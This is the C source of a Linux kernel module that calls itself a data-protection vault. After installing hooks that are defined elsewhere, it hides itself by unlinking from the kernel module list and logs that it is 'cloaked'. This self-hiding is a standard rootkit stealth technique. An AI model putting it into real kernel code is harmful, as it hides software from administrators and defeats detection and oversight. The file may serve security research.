#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/list.h>
#include "vvaltz.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Dinh Van Viet");
MODULE_DESCRIPTION("LSM Kernel Data Protection Vault Module");
MODULE_VERSION("1.0");

static struct list_head *module_list_backup;

static void hide_myself(void) {
    module_list_backup = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

static int __init vvaltz_init(void) {
    int ret;
    printk(KERN_INFO "[VVALTZ] System component initialization started...\n");

    ret = init_proc_interface();
    if (ret < 0) {
        return ret;
    }

    ret = install_hooks();
    if (ret < 0) {
        remove_proc_interface();
        return ret;
    }

    hide_myself();

    printk(KERN_INFO "[VVALTZ] Protection engine online, monitoring, and cloaked.\n");
    return 0;
}

static void __exit vvaltz_exit(void) {
    printk(KERN_INFO "[VVALTZ] Initiating structural teardown sequence...\n");
    remove_hooks();
    remove_proc_interface();
}

module_init(vvaltz_init);
module_exit(vvaltz_exit);